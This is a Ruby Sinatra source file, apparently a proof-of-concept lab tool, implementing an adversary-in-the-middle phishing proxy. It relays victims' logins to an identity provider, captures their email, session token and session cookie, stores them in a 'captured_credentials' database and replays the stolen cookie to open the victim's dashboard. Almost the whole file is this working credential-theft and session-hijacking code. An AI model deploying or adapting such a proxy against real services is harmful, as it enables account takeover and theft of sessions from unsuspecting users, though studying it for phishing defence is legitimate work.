#----------------------------------
#       PROXY - AiTM
#----------------------------------

require 'sinatra/base'
require 'sinatra/contrib'
require 'sequel'
require 'sqlite3'
require 'dotenv/load'
require 'uri'
require 'net/http'

# DB propia del proxy
PROXY_DB = Sequel.connect("sqlite://#{__dir__}/../captured_credentials.db")

PROXY_DB.create_table?(:captured_credentials) do
  primary_key :id
  String   :email
  String   :token
  String   :ip
  String   :user_agent
  String   :session_cookie
  DateTime :captured_at
end

IDP_URL   = ENV['IDP_URL']   || 'http://localhost:4444'
PROXY_URL = ENV['PROXY_URL'] || 'http://localhost:4445'

class AvatarProxy < Sinatra::Base
  use Rack::Session::Cookie,
      key: "proxy_session",
      secret: "proxy_vaatu_secret_future_industries_poc_2024_long_enough_string"

  set :public_folder, File.join(__dir__, '..', 'public')
  set :static, true

  helpers do
    def rewrite_html(html)
      html.gsub(IDP_URL, PROXY_URL)
          .gsub("localhost:4444", "localhost:4445")
    end
  end

  get "/" do
    redirect "/login"
  end

  get "/login" do
    uri = URI("#{IDP_URL}/login")
    response = Net::HTTP.get_response(uri)
    content_type 'text/html'
    rewrite_html(response.body)
  end

  post "/login" do
    email    = params[:email].to_s.downcase.strip
    password = params[:password].to_s

    puts "Proxy: Received login attempt for #{email}"

    # Net::HTTP no sigue redirects automáticamente
    # perfecto para capturar el 302 con el token y la cookie
    uri = URI("#{IDP_URL}/login")
    req = Net::HTTP::Post.new(uri)
    req['Content-Type'] = 'application/x-www-form-urlencoded'
    req['User-Agent']       = request.user_agent if request.user_agent
    req['Accept']           = request.env['HTTP_ACCEPT'] if request.env['HTTP_ACCEPT']
    req['Accept-Language']  = request.env['HTTP_ACCEPT_LANGUAGE'] if request.env['HTTP_ACCEPT_LANGUAGE']

    req.body = URI.encode_www_form({
      email:    email,
      password: password
    })

    http          = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl  = (uri.scheme == 'https')
    idp_response  = http.request(req)

    puts "Proxy: IdP response status: #{idp_response.code}"
    puts "Proxy: IdP response headers: #{idp_response.to_hash}"

    if idp_response.code == "302"
      location       = idp_response['location']
      token          = location.match(/token=(.+)/)[1] rescue nil
      raw_cookie     = idp_response['set-cookie']
      session_cookie = raw_cookie.split(';').first rescue nil

      puts "Proxy: Token captured: #{token}"
      puts "Proxy: Cookie captured: #{session_cookie}"

      if token && session_cookie
        PROXY_DB[:captured_credentials].insert(
          email:          email,
          token:          token,
          ip:             request.ip,
          user_agent:     request.user_agent,
          session_cookie: session_cookie,
          captured_at:    Time.now
        )

        session[:user]       = email
        session[:token]      = token
        session[:idp_cookie] = session_cookie

        redirect "/dashboard"
      else
        puts "Proxy: Token or cookie not found"
        content_type 'text/html'
        rewrite_html(Net::HTTP.get(URI("#{IDP_URL}/login")))
      end
    else
      puts "Proxy: IDP did not return 302, showing login again"
      content_type 'text/html'
      rewrite_html(Net::HTTP.get(URI("#{IDP_URL}/login")))
    end
  end

  get "/dashboard" do
    halt 401, "Not authorized" unless session[:user]

    uri = URI("#{IDP_URL}/dashboard")
    req = Net::HTTP::Get.new(uri)
    req['Cookie'] = session[:idp_cookie]

    http         = Net::HTTP.new(uri.host, uri.port)
    idp_response = http.request(req)

    content_type 'text/html'
    rewrite_html(idp_response.body)
  end

  get "/logout" do
    session.clear
    redirect "/login"
  end
end